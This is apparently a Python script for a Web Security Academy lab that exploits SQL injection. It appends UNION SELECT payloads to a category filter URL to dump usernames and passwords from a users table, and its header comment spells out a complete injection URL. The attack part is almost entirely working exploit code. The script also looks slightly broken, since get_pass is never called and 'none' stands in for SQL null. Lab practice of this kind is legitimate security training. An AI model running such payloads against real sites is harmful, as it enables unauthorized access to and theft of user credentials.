# Get number of colums, then check for 
# which one can contain text and do the concatenation
# payload is
# https://ace61f011e7f301f807f0fc0000d001b.web-security-academy.net/filter?category=Pets%27%20union%20select%20null,username||%27~%27||password%20from%20users%20--

from Lab2 import get_cols_no, determine_col
from pwn import *
import requests

def get_pass(url, index, cols):
    u, v = index[0], index[1]
    payload = 'none, ' * (u - 1) + 'username, ' \
                + 'none, ' * (v - u - 1)        \
                + 'password' + ', none' * (cols - v - 1)   \
                + ' from users --'
    new_url = url + '\' union select {}'.format(payload)
    response = requests.get(new_url)
    print(response.text)

if __name__ == '__main__':
    url = 'https://ace61f011e7f301f807f0fc0000d001b.web-security-academy.net/filter?category=Pets'
    col_no = get_cols_no(url, 1, 10)
    index = determine_col(url, col_no)
    log.success(index)